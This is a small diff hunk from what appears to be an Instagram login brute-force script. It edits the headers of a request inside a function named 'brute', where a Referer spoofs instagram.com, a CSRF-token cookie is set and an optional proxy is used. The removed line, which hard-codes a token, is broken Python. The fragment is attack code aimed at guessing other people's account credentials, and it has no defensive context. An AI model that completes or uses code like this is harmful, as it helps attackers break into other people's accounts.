@@ -141,7 +141,7 @@ def brute(q):
                 "X-Requested-With": "XMLHttpRequest",
                 "Referer": "https://www.instagram.com/",
                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                'Cookie': 'csrftoken=  7dmO9F3JuVGvSXumd79yByPxnHoWHz1A ' + csrf_token =(' 7dmO9F3JuVGvSXumd79yByPxnHoWHz1A ')
+                'Cookie': 'csrftoken=' + csrf_token
             }
 
             if proxy:
